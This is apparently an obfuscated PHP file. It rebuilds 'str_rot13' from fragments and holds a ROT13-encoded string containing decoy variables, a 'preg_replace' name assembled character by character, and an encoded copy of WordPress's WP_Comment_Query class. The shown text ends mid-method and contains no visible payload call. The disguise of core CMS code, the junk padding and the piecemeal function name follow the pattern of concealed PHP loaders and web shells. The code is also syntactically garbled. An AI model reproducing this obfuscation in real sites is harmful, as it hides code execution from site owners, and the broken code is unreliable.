<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Pbzzrag NCV: JC_Pbzzrag_Dhrel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Pbzzragf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq sbe dhrelvat pbzzragf.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Pbzzrag_Dhrel::__pbafgehpg() sbe npprcgrq nethzragf.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Pbzzrag_Dhrel {

	/**
	 * FDY sbe qngnonfr dhrel.
	 *
	 * @fvapr 4.0.1
	 * @ine fgevat
	 */
	choyvp $erdhrfg;

	/**
	 * Zrgnqngn dhrel pbagnvare
	 *
	 * @fvapr 3.5.0
	 * @ine JC_Zrgn_Dhrel N zrgn dhrel vafgnapr.
	 */
	choyvp $zrgn_dhrel = snyfr;

	/**
	 * Zrgnqngn dhrel pynhfrf.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl
	 */
	cebgrpgrq $zrgn_dhrel_pynhfrf;

	/**
	 * FDY dhrel pynhfrf.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl
	 */
	cebgrpgrq $fdy_pynhfrf = neenl(
		'fryrpg'  => '',
		'sebz'    => '',
		'jurer'   => neenl(),
		'tebhcol' => '',
		'beqreol' => '',
		'yvzvgf'  => '',
	);

	/**
	 * FDY JURER pynhfr.
	 *
	 * Fgberq nsgre gur {@frr 'pbzzragf_pynhfrf'} svygre vf eha ba gur pbzcvyrq JURER fho-pynhfrf.
	 *
	 * @fvapr 4.4.2
	 * @ine fgevat
	 */
	cebgrpgrq $svygrerq_jurer_pynhfr;

	/**
	 * Qngr dhrel pbagnvare
	 *
	 * @fvapr 3.7.0
	 * @ine JC_Qngr_Dhrel N qngr dhrel vafgnapr.
	 */
	choyvp $qngr_dhrel = snyfr;

	/**
	 * Dhrel inef frg ol gur hfre.
	 *
	 * @fvapr 3.1.0
	 * @ine neenl
	 */
	choyvp $dhrel_inef;

	/**
	 * Qrsnhyg inyhrf sbe dhrel inef.
	 *
	 * @fvapr 4.2.0
	 * @ine neenl
	 */
	choyvp $dhrel_ine_qrsnhygf;

	/**
	 * Yvfg bs pbzzragf ybpngrq ol gur dhrel.
	 *
	 * @fvapr 4.0.0
	 * @ine vag[]|JC_Pbzzrag[]
	 */
	choyvp $pbzzragf;

	/**
	 * Gur nzbhag bs sbhaq pbzzragf sbe gur pheerag dhrel.
	 *
	 * @fvapr 4.4.0
	 * @ine vag
	 */
	choyvp $sbhaq_pbzzragf = 0;

	/**
	 * Gur ahzore bs cntrf.
	 *
	 * @fvapr 4.4.0
	 * @ine vag
	 */
	choyvp $znk_ahz_cntrf = 0;

	/**
	 * Znxr cevingr/cebgrpgrq zrgubqf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr      Zrgubq gb pnyy.
	 * @cnenz neenl  $nethzragf Nethzragf gb cnff jura pnyyvat.
	 * @erghea zvkrq|snyfr Erghea inyhr bs gur pnyyonpx, snyfr bgurejvfr.
	 */
	choyvp shapgvba __pnyy( $anzr, $nethzragf ) {
		vs ( 'trg_frnepu_fdy' === $anzr ) {
			erghea $guvf->trg_frnepu_fdy( ...$nethzragf );
		}
		erghea snyfr;
	}

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur pbzzrag dhrel, onfrq ba gur dhrel inef cnffrq.
	 *
	 * @fvapr 4.2.0
	 * @fvapr 4.4.0 `$cnerag__va` naq `$cnerag__abg_va` jrer nqqrq.
	 * @fvapr 4.4.0 Beqre ol `pbzzrag__va` jnf nqqrq. `$hcqngr_pbzzrag_zrgn_pnpur`, `$ab_sbhaq_ebjf`,
	 *              `$uvrenepuvpny`, naq `$hcqngr_pbzzrag_cbfg_pnpur` jrer nqqrq.
	 * @fvapr 4.5.0 Vagebqhprq gur `$nhgube_hey` nethzrag.
	 * @fvapr 4.6.0 Vagebqhprq gur `$pnpur_qbznva` nethzrag.
	 * @fvapr 4.9.0 Vagebqhprq gur `$cntrq` nethzrag.
	 * @fvapr 5.1.0 Vagebqhprq gur `$zrgn_pbzcner_xrl` nethzrag.
	 * @fvapr 5.3.0 Vagebqhprq gur `$zrgn_glcr_xrl` nethzrag.
	 *
	 * @cnenz fgevat|neenl $dhrel {
	 *     Bcgvbany. Neenl be dhrel fgevat bs pbzzrag dhrel cnenzrgref. Qrsnhyg rzcgl.
	 *
	 *     @glcr fgevat          $nhgube_rznvy              Pbzzrag nhgube rznvy nqqerff. Qrsnhyg rzcgl.
	 *     @glcr fgevat          $nhgube_hey                Pbzzrag nhgube HEY. Qrsnhyg rzcgl.
	 *     @glcr vag[]           $nhgube__va                Neenl bs nhgube VQf gb vapyhqr pbzzragf sbe. Qrsnhyg rzcgl.
	 *     @glcr vag[]           $nhgube__abg_va            Neenl bs nhgube VQf gb rkpyhqr pbzzragf sbe. Qrsnhyg rzcgl.
	 *     @glcr vag[]           $pbzzrag__va               Neenl bs pbzzrag VQf gb vapyhqr. Qrsnhyg rzcgl.
	 *     @glcr vag[]           $pbzzrag__abg_va           Neenl bs pbzzrag VQf gb rkpyhqr. Qrsnhyg rzcgl.
	 *     @glcr obby            $pbhag                     Jurgure gb erghea n pbzzrag pbhag (gehr) be neenl bs
	 *                                                      pbzzrag bowrpgf (snyfr). Qrsnhyg snyfr.
	 *     @glcr neenl           $qngr_dhrel                Qngr dhrel pynhfrf gb yvzvg pbzzragf ol. Frr JC_Qngr_Dhrel.
	 *                                                      Qrsnhyg ahyy.
	 *     @glcr fgevat          $svryqf                    Pbzzrag svryqf gb erghea. Npprcgf 'vqf' sbe pbzzrag VQf
	 *                                                      bayl be rzcgl sbe nyy svryqf. Qrsnhyg rzcgl.
	 *     @glcr neenl           $vapyhqr_hanccebirq        Neenl bs VQf be rznvy nqqerffrf bs hfref jubfr hanccebirq
	 *                                                      pbzzragf jvyy or erghearq ol gur dhrel ertneqyrff bs
	 *                                                      `$fgnghf`. Qrsnhyg rzcgl.
	 *     @glcr vag             $xnezn                     Xnezn fpber gb ergevrir zngpuvat pbzzragf sbe.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr fgevat|fgevat[] $zrgn_xrl                  Zrgn xrl be xrlf gb svygre ol.
	 *     @glcr fgevat|fgevat[] $zrgn_inyhr                Zrgn inyhr be inyhrf gb svygre ol.
	 *     @glcr fgevat          $zrgn_pbzcner              ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn inyhr.
	 *                                                      Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_pbzcner_xrl          ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn xrl.
	 *                                                      Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr                 ZlFDY qngn glcr gung gur zrgn_inyhr pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                      Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr_xrl             ZlFDY qngn glcr gung gur zrgn_xrl pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                      Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr neenl           $zrgn_dhrel                Na nffbpvngvir neenl bs JC_Zrgn_Dhrel nethzragf.
	 *                                                      Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf.
	 *     @glcr vag             $ahzore                    Znkvzhz ahzore bs pbzzragf gb ergevrir.
	 *                                                      Qrsnhyg rzcgl (ab yvzvg).
	 *     @glcr vag             $cntrq                     Jura hfrq jvgu `$ahzore`, qrsvarf gur cntr bs erfhygf gb erghea.
	 *                                                      Jura hfrq jvgu `$bssfrg`, `$bssfrg` gnxrf cerprqrapr. Qrsnhyg 1.
	 *     @glcr vag             $bssfrg                    Ahzore bs pbzzragf gb bssfrg gur dhrel. Hfrq gb ohvyq
	 *                                                      YVZVG pynhfr. Qrsnhyg 0.
	 *     @glcr obby            $ab_sbhaq_ebjf             Jurgure gb qvfnoyr gur `FDY_PNYP_SBHAQ_EBJF` dhrel.
	 *                                                      Qrsnhyg: gehr.
	 *     @glcr fgevat|neenl    $beqreol                   Pbzzrag fgnghf be neenl bs fgnghfrf. Gb hfr 'zrgn_inyhr'
	 *                                                      be 'zrgn_inyhr_ahz', `$zrgn_xrl` zhfg nyfb or qrsvarq.
	 *                                                      Gb fbeg ol n fcrpvsvp `$zrgn_dhrel` pynhfr, hfr gung
	 *                                                      pynhfr'f neenl xrl. Npprcgf:
	 *                                                      - 'pbzzrag_ntrag'
	 *                                                      - 'pbzzrag_nccebirq'
	 *                                                      - 'pbzzrag_nhgube'
	 *                                                      - 'pbzzrag_nhgube_rznvy'
	 *                                                      - 'pbzzrag_nhgube_VC'
	 *                                                      - 'pbzzrag_nhgube_hey'
	 *                                                      - 'pbzzrag_pbagrag'
	 *                                                      - 'pbzzrag_qngr'
	 *                                                      - 'pbzzrag_qngr_tzg'
	 *                                                      - 'pbzzrag_VQ'
	 *                                                      - 'pbzzrag_xnezn'
	 *                                                      - 'pbzzrag_cnerag'
	 *                                                      - 'pbzzrag_cbfg_VQ'
	 *                                                      - 'pbzzrag_glcr'
	 *                                                      - 'hfre_vq'
	 *                                                      - 'pbzzrag__va'
	 *                                                      - 'zrgn_inyhr'
	 *                                                      - 'zrgn_inyhr_ahz'
	 *                                                      - Gur inyhr bs `$zrgn_xrl`
	 *                                                      - Gur neenl xrlf bs `$zrgn_dhrel`
	 *                                                      - snyfr, na rzcgl neenl, be 'abar' gb qvfnoyr `BEQRE OL` pynhfr.
	 *                                                      Qrsnhyg: 'pbzzrag_qngr_tzg'.
	 *     @glcr fgevat          $beqre                     Ubj gb beqre ergevrirq pbzzragf. Npprcgf 'NFP', 'QRFP'.
	 *                                                      Qrsnhyg: 'QRFP'.
	 *     @glcr vag             $cnerag                    Cnerag VQ bs pbzzrag gb ergevrir puvyqera bs.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr vag[]           $cnerag__va                Neenl bs cnerag VQf bs pbzzragf gb ergevrir puvyqera sbe.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr vag[]           $cnerag__abg_va            Neenl bs cnerag VQf bs pbzzragf *abg* gb ergevrir
	 *                                                      puvyqera sbe. Qrsnhyg rzcgl.
	 *     @glcr vag[]           $cbfg_nhgube__va           Neenl bs nhgube VQf gb ergevrir pbzzragf sbe.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr vag[]           $cbfg_nhgube__abg_va       Neenl bs nhgube VQf *abg* gb ergevrir pbzzragf sbe.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr vag             $cbfg_vq                   Yvzvg erfhygf gb gubfr nssvyvngrq jvgu n tvira cbfg VQ.
	 *                                                      Qrsnhyg 0.
	 *     @glcr vag[]           $cbfg__va                  Neenl bs cbfg VQf gb vapyhqr nssvyvngrq pbzzragf sbe.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr vag[]           $cbfg__abg_va              Neenl bs cbfg VQf gb rkpyhqr nssvyvngrq pbzzragf sbe.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr vag             $cbfg_nhgube               Cbfg nhgube VQ gb yvzvg erfhygf ol. Qrsnhyg rzcgl.
	 *     @glcr fgevat|fgevat[] $cbfg_fgnghf               Cbfg fgnghf be neenl bs cbfg fgnghfrf gb ergevrir
	 *                                                      nssvyvngrq pbzzragf sbe. Cnff 'nal' gb zngpu nal inyhr.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr fgevat|fgevat[] $cbfg_glcr                 Cbfg glcr be neenl bs cbfg glcrf gb ergevrir nssvyvngrq
	 *                                                      pbzzragf sbe. Cnff 'nal' gb zngpu nal inyhr. Qrsnhyg rzcgl.
	 *     @glcr fgevat          $cbfg_anzr                 Cbfg anzr gb ergevrir nssvyvngrq pbzzragf sbe.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr vag             $cbfg_cnerag               Cbfg cnerag VQ gb ergevrir nssvyvngrq pbzzragf sbe.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr fgevat          $frnepu                    Frnepu grez(f) gb ergevrir zngpuvat pbzzragf sbe.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr fgevat|neenl    $fgnghf                    Pbzzrag fgnghfrf gb yvzvg erfhygf ol. Npprcgf na neenl
	 *                                                      be fcnpr/pbzzn-frcnengrq yvfg bs 'ubyq' (`pbzzrag_fgnghf=0`),
	 *                                                      'nccebir' (`pbzzrag_fgnghf=1`), 'nyy', be n phfgbz
	 *                                                      pbzzrag fgnghf. Qrsnhyg 'nyy'.
	 *     @glcr fgevat|fgevat[] $glcr                      Vapyhqr pbzzragf bs n tvira glcr, be neenl bs glcrf.
	 *                                                      Npprcgf 'pbzzrag', 'cvatf' (vapyhqrf 'cvatonpx' naq
	 *                                                      'genpxonpx'), be nal phfgbz glcr fgevat. Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $glcr__va                  Vapyhqr pbzzragf sebz n tvira neenl bs pbzzrag glcrf.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr fgevat[]        $glcr__abg_va              Rkpyhqr pbzzragf sebz n tvira neenl bs pbzzrag glcrf.
	 *                                                      Qrsnhyg rzcgl.
	 *     @glcr vag             $hfre_vq                   Vapyhqr pbzzragf sbe n fcrpvsvp hfre VQ. Qrsnhyg rzcgl.
	 *     @glcr obby|fgevat     $uvrenepuvpny              Jurgure gb vapyhqr pbzzrag qrfpraqnagf va gur erfhygf.
	 *                                                      - 'guernqrq' ergheaf n gerr, jvgu rnpu pbzzrag'f puvyqera
	 *                                                        fgberq va n `puvyqera` cebcregl ba gur `JC_Pbzzrag` bowrpg.
	 *                                                      - 'syng' ergheaf n syng neenl bs sbhaq pbzzragf cyhf
	 *                                                        gurve puvyqera.
	 *                                                      - Obbyrna `snyfr` yrnirf bhg qrfpraqnagf.
	 *                                                      Gur cnenzrgre vf vtaberq (sbeprq gb `snyfr`) jura
	 *                                                      `$svryqf` vf 'vqf' be 'pbhagf'. Npprcgf 'guernqrq',
	 *                                                      'syng', be snyfr. Qrsnhyg: snyfr.
	 *     @glcr fgevat          $pnpur_qbznva              Havdhr pnpur xrl gb or cebqhprq jura guvf dhrel vf fgberq va
	 *                                                      na bowrpg pnpur. Qrsnhyg vf 'pber'.
	 *     @glcr obby            $hcqngr_pbzzrag_zrgn_pnpur Jurgure gb cevzr gur zrgnqngn pnpur sbe sbhaq pbzzragf.
	 *                                                      Qrsnhyg gehr.
	 *     @glcr obby            $hcqngr_pbzzrag_cbfg_pnpur Jurgure gb cevzr gur pnpur sbe pbzzrag cbfgf.
	 *                                                      Qrsnhyg snyfr.
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $dhrel = '' ) {
		$guvf->dhrel_ine_qrsnhygf = neenl(
			'nhgube_rznvy'              => '',
			'nhgube_hey'                => '',
			'nhgube__va'                => '',
			'nhgube__abg_va'            => '',
			'vapyhqr_hanccebirq'        => '',
			'svryqf'                    => '',
			'VQ'                        => '',
			'pbzzrag__va'               => '',
			'pbzzrag__abg_va'           => '',
			'xnezn'                     => '',
			'ahzore'                    => '',
			'bssfrg'                    => '',
			'ab_sbhaq_ebjf'             => gehr,
			'beqreol'                   => '',
			'beqre'                     => 'QRFP',
			'cntrq'                     => 1,
			'cnerag'                    => '',
			'cnerag__va'                => '',
			'cnerag__abg_va'            => '',
			'cbfg_nhgube__va'           => '',
			'cbfg_nhgube__abg_va'       => '',
			'cbfg_VQ'                   => '',
			'cbfg_vq'                   => 0,
			'cbfg__va'                  => '',
			'cbfg__abg_va'              => '',
			'cbfg_nhgube'               => '',
			'cbfg_anzr'                 => '',
			'cbfg_cnerag'               => '',
			'cbfg_fgnghf'               => '',
			'cbfg_glcr'                 => '',
			'fgnghf'                    => 'nyy',
			'glcr'                      => '',
			'glcr__va'                  => '',
			'glcr__abg_va'              => '',
			'hfre_vq'                   => '',
			'frnepu'                    => '',
			'pbhag'                     => snyfr,
			'zrgn_xrl'                  => '',
			'zrgn_inyhr'                => '',
			'zrgn_dhrel'                => '',
			'qngr_dhrel'                => ahyy, // Frr JC_Qngr_Dhrel.
			'uvrenepuvpny'              => snyfr,
			'pnpur_qbznva'              => 'pber',
			'hcqngr_pbzzrag_zrgn_pnpur' => gehr,
			'hcqngr_pbzzrag_cbfg_pnpur' => snyfr,
		);

		vs ( ! rzcgl( $dhrel ) ) {
			$guvf->dhrel( $dhrel );
		}
	}

	/**
	 * Cnefr nethzragf cnffrq gb gur pbzzrag dhrel jvgu qrsnhyg dhrel cnenzrgref.
	 *
	 * @fvapr 4.2.0 Rkgenpgrq sebz JC_Pbzzrag_Dhrel::dhrel().
	 *
	 * @cnenz fgevat|neenl $dhrel JC_Pbzzrag_Dhrel nethzragf. Frr JC_Pbzzrag_Dhrel::__pbafgehpg() sbe npprcgrq nethzragf.
	 */
	choyvp shapgvba cnefr_dhrel( $dhrel = '' ) {
		vs ( rzcgl( $dhrel ) ) {
			$dhrel = $guvf->dhrel_inef;
		}

		$guvf->dhrel_inef = jc_cnefr_netf( $dhrel, $guvf->dhrel_ine_qrsnhygf );

		/**
		 * Sverf nsgre gur pbzzrag dhrel inef unir orra cnefrq.
		 *
		 * @fvapr 4.2.0
		 *
		 * @cnenz JC_Pbzzrag_Dhrel $dhrel Gur JC_Pbzzrag_Dhrel vafgnapr (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cnefr_pbzzrag_dhrel', neenl( &$guvf ) );
	}

	/**
	 * Frgf hc gur JbeqCerff dhrel sbe ergevrivat pbzzragf.
	 *
	 * @fvapr 3.1.0
	 * @fvapr 4.1.0 Vagebqhprq 'pbzzrag__va', 'pbzzrag__abg_va', 'cbfg_nhgube__va',
	 *              'cbfg_nhgube__abg_va', 'nhgube__va', 'nhgube__abg_va', 'cbfg__va',
	 *              'cbfg__abg_va', 'vapyhqr_hanccebirq', 'glcr__va', naq 'glcr__abg_va'
	 *              nethzragf gb $dhrel_inef.
	 * @fvapr 4.2.0 Zbirq cnefvat gb JC_Pbzzrag_Dhrel::cnefr_dhrel().
	 *
	 * @cnenz fgevat|neenl $dhrel Neenl be HEY dhrel fgevat bs cnenzrgref.
	 * @erghea neenl|vag Yvfg bs pbzzragf, be ahzore bs pbzzragf jura 'pbhag' vf cnffrq nf n dhrel ine.
	 */
	choyvp shapgvba dhrel( $dhrel ) {
		$guvf->dhrel_inef = jc_cnefr_netf( $dhrel );
		erghea $guvf->trg_pbzzragf();
	}

	/**
	 * Trg n yvfg bs pbzzragf zngpuvat gur dhrel inef.
	 *
	 * @fvapr 4.2.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea vag|vag[]|JC_Pbzzrag[] Yvfg bs pbzzragf be ahzore bs sbhaq pbzzragf vs `$pbhag` nethzrag vf gehr.
	 */
	choyvp shapgvba trg_pbzzragf() {
		tybony $jcqo;

		$guvf->cnefr_dhrel();

		// Cnefr zrgn dhrel.
		$guvf->zrgn_dhrel = arj JC_Zrgn_Dhrel();
		$guvf->zrgn_dhrel->cnefr_dhrel_inef( $guvf->dhrel_inef );

		/**
		 * Sverf orsber pbzzragf ner ergevrirq.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz JC_Pbzzrag_Dhrel $dhrel Pheerag vafgnapr bs JC_Pbzzrag_Dhrel (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cer_trg_pbzzragf', neenl( &$guvf ) );

		// Ercnefr dhrel inef, va pnfr gurl jrer zbqvsvrq va n 'cer_trg_pbzzragf' pnyyonpx.
		$guvf->zrgn_dhrel->cnefr_dhrel_inef( $guvf->dhrel_inef );
		vs ( ! rzcgl( $guvf->zrgn_dhrel->dhrevrf ) ) {
			$guvf->zrgn_dhrel_pynhfrf = $guvf->zrgn_dhrel->trg_fdy( 'pbzzrag', $jcqo->pbzzragf, 'pbzzrag_VQ', $guvf );
		}

		$pbzzrag_qngn = ahyy;

		/**
		 * Svygref gur pbzzragf qngn orsber gur dhrel gnxrf cynpr.
		 *
		 * Erghea n aba-ahyy inyhr gb olcnff JbeqCerff' qrsnhyg pbzzrag dhrevrf.
		 *
		 * Gur rkcrpgrq erghea glcr sebz guvf svygre qrcraqf ba gur inyhr cnffrq
		 * va gur erdhrfg dhrel inef:
		 * - Jura `$guvf->dhrel_inef['pbhag']` vf frg, gur svygre fubhyq erghea
		 *   gur pbzzrag pbhag nf na vagrtre.
		 * - Jura `'vqf' === $guvf->dhrel_inef['svryqf']`, gur svygre fubhyq erghea
		 *   na neenl bs pbzzrag VQf.
		 * - Bgurejvfr gur svygre fubhyq erghea na neenl bs JC_Pbzzrag bowrpgf.
		 *
		 * Abgr gung vs gur svygre ergheaf na neenl bs pbzzrag qngn, vg jvyy or nffvtarq
		 * gb gur `pbzzragf` cebcregl bs gur pheerag JC_Pbzzrag_Dhrel vafgnapr.
		 *
		 * Svygrevat shapgvbaf gung erdhver cntvangvba vasbezngvba ner rapbhentrq gb frg
		 * gur `sbhaq_pbzzragf` naq `znk_ahz_cntrf` cebcregvrf bs gur JC_Pbzzrag_Dhrel bowrpg,
		 * cnffrq gb gur svygre ol ersrerapr. Vs JC_Pbzzrag_Dhrel qbrf abg cresbez n qngnonfr
		 * dhrel, vg jvyy abg unir rabhtu vasbezngvba gb trarengr gurfr inyhrf vgfrys.
		 *
		 * @fvapr 5.3.0
		 * @fvapr 5.6.0 Gur erghearq neenl bs pbzzrag qngn vf nffvtarq gb gur `pbzzragf` cebcregl
		 *              bs gur pheerag JC_Pbzzrag_Dhrel vafgnapr.
		 *
		 * @cnenz neenl|vag|ahyy   $pbzzrag_qngn Erghea na neenl bs pbzzrag qngn gb fubeg-pvephvg JC'f pbzzrag dhrel,
		 *                                       gur pbzzrag pbhag nf na vagrtre vs `$guvf->dhrel_inef['pbhag']` vf frg,
		 *                                       be ahyy gb nyybj JC gb eha vgf abezny dhrevrf.
		 * @cnenz JC_Pbzzrag_Dhrel $dhrel        Gur JC_Pbzzrag_Dhrel vafgnapr, cnffrq ol ersrerapr.
		 */
		$pbzzrag_qngn = nccyl_svygref_ers_neenl( 'pbzzragf_cer_dhrel', neenl( $pbzzrag_qngn, &$guvf ) );

		vs ( ahyy !== $pbzzrag_qngn ) {
			vs ( vf_neenl( $pbzzrag_qngn ) && ! $guvf->dhrel_inef['pbhag'] ) {
				$guvf->pbzzragf = $pbzzrag_qngn;
			}

			erghea $pbzzrag_qngn;
		}

		/*
		 * Bayl hfr gur netf qrsvarq va gur dhrel_ine_qrsnhygf gb pbzchgr gur xrl,
		 * ohg vtaber 'svryqf', 'hcqngr_pbzzrag_zrgn_pnpur', 'hcqngr_pbzzrag_cbfg_pnpur' juvpu qbrf abg nssrpg dhrel erfhygf.
		 */
		$_netf = jc_neenl_fyvpr_nffbp( $guvf->dhrel_inef, neenl_xrlf( $guvf->dhrel_ine_qrsnhygf ) );
		hafrg( $_netf['svryqf'], $_netf['hcqngr_pbzzrag_zrgn_pnpur'], $_netf['hcqngr_pbzzrag_cbfg_pnpur'] );

		$xrl          = zq5( frevnyvmr( $_netf ) );
		$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'pbzzrag' );

		$pnpur_xrl   = \"trg_pbzzragf:$xrl:$ynfg_punatrq\";
		$pnpur_inyhr = jc_pnpur_trg( $pnpur_xrl, 'pbzzrag-dhrevrf' );
		vs ( snyfr === $pnpur_inyhr ) {
			$pbzzrag_vqf = $guvf->trg_pbzzrag_vqf();
			vs ( $pbzzrag_vqf ) {
				$guvf->frg_sbhaq_pbzzragf();
			}

			$pnpur_inyhr = neenl(
				'pbzzrag_vqf'    => $pbzzrag_vqf,
				'sbhaq_pbzzragf' => $guvf->sbhaq_pbzzragf,
			);
			jc_pnpur_nqq( $pnpur_xrl, $pnpur_inyhr, 'pbzzrag-dhrevrf' );
		} ryfr {
			$pbzzrag_vqf          = $pnpur_inyhr['pbzzrag_vqf'];
			$guvf->sbhaq_pbzzragf = $pnpur_inyhr['sbhaq_pbzzragf'];
		}

		vs ( $guvf->sbhaq_pbzzragf && $guvf->dhrel_inef['ahzore'] ) {
			$guvf->znk_ahz_cntrf = (vag) prvy( $guvf->sbhaq_pbzzragf / $guvf->dhrel_inef['ahzore'] );
		}

		// Vs dhrelvat sbe n pbhag bayl, gurer'f abguvat zber gb qb.
		vs ( $guvf->dhrel_inef['pbhag'] ) {
			// $pbzzrag_vqf vf npghnyyl n pbhag va guvf pnfr.
			erghea (vag) $pbzzrag_vqf;
		}

		$pbzzrag_vqf = neenl_znc( 'vaginy', $pbzzrag_vqf );

		vs ( $guvf->dhrel_inef['hcqngr_pbzzrag_zrgn_pnpur'] ) {
			jc_ynmlybnq_pbzzrag_zrgn( $pbzzrag_vqf );
		}

		vs ( 'vqf' === $guvf->dhrel_inef['svryqf'] ) {
			$guvf->pbzzragf = $pbzzrag_vqf;
			erghea $guvf->pbzzragf;
		}

		_cevzr_pbzzrag_pnpurf( $pbzzrag_vqf, snyfr );

		// Srgpu shyy pbzzrag bowrpgf sebz gur cevzrq pnpur.
		$_pbzzragf = neenl();
		sbernpu ( $pbzzrag_vqf nf $pbzzrag_vq ) {
			$_pbzzrag = trg_pbzzrag( $pbzzrag_vq );
			vs ( $_pbzzrag ) {
				$_pbzzragf[] = $_pbzzrag;
			}
		}

		// Cevzr pbzzrag cbfg pnpurf.
		vs ( $guvf->dhrel_inef['hcqngr_pbzzrag_cbfg_pnpur'] ) {
			$pbzzrag_cbfg_vqf = neenl();
			sbernpu ( $_pbzzragf nf $_pbzzrag ) {
				$pbzzrag_cbfg_vqf[] = $_pbzzrag->pbzzrag_cbfg_VQ;
			}

			_cevzr_cbfg_pnpurf( $pbzzrag_cbfg_vqf, snyfr, snyfr );
		}

		/**
		 * Svygref gur pbzzrag dhrel erfhygf.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz JC_Pbzzrag[]     $_pbzzragf Na neenl bs pbzzragf.
		 * @cnenz JC_Pbzzrag_Dhrel $dhrel     Pheerag vafgnapr bs JC_Pbzzrag_Dhrel (cnffrq ol ersrerapr).
		 */
		$_pbzzragf = nccyl_svygref_ers_neenl( 'gur_pbzzragf', neenl( $_pbzzragf, &$guvf ) );

		// Pbaireg gb JC_Pbzzrag vafgnaprf.
		$pbzzragf = neenl_znc( 'trg_pbzzrag', $_pbzzragf );

		vs ( $guvf->dhrel_inef['uvrenepuvpny'] ) {
			$pbzzragf = $guvf->svyy_qrfpraqnagf( $pbzzragf );
		}

		$guvf->pbzzragf = $pbzzragf;
		erghea $guvf->pbzzragf;
	}

	/**
	 * Hfrq vagreanyyl gb trg n yvfg bs pbzzrag VQf zngpuvat gur dhrel inef.
	 *
	 * @fvapr 4.4.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea vag|neenl N fvatyr pbhag bs pbzzrag VQf vs n pbhag dhrel. Na neenl bs pbzzrag VQf vs n shyy dhrel.
	 */
	cebgrpgrq shapgvba trg_pbzzrag_vqf() {
		tybony $jcqo;

		// Nffrzoyr pynhfrf eryngrq gb 'pbzzrag_nccebirq'.
		$nccebirq_pynhfrf = neenl();

		// 'fgnghf' npprcgf na neenl be n pbzzn-frcnengrq fgevat.
		$fgnghf_pynhfrf = neenl();
		$fgnghfrf       = jc_cnefr_yvfg( $guvf->dhrel_inef['fgnghf'] );

		// Rzcgl 'fgnghf' fubhyq or vagrecergrq nf 'nyy'.
		vs ( rzcgl( $fgnghfrf ) ) {
			$fgnghfrf = neenl( 'nyy' );
		}

		// 'nal' bireevqrf bgure fgnghfrf.
		vs ( ! va_neenl( 'nal', $fgnghfrf, gehr ) ) {
			sbernpu ( $fgnghfrf nf $fgnghf ) {
				fjvgpu ( $fgnghf ) {
					pnfr 'ubyq':
						$fgnghf_pynhfrf[] = \"pbzzrag_nccebirq = '0'\";
						oernx;

					pnfr 'nccebir':
						$fgnghf_pynhfrf[] = \"pbzzrag_nccebirq = '1'\";
						oernx;

					pnfr 'nyy':
					pnfr '':
						$fgnghf_pynhfrf[] = \"( pbzzrag_nccebirq = '0' BE pbzzrag_nccebirq = '1' )\";
						oernx;

					qrsnhyg:
						$fgnghf_pynhfrf[] = $jcqo->cercner( 'pbzzrag_nccebirq = %f', $fgnghf );
						oernx;
				}
			}

			$nccebirq_pynhfrf[] = '( ' . vzcybqr( ' BE ', $fgnghf_pynhfrf ) . ' )';
		}

		// Hfre VQf be rznvyf jubfr hanccebirq pbzzragf ner vapyhqrq, ertneqyrff bs $fgnghf.
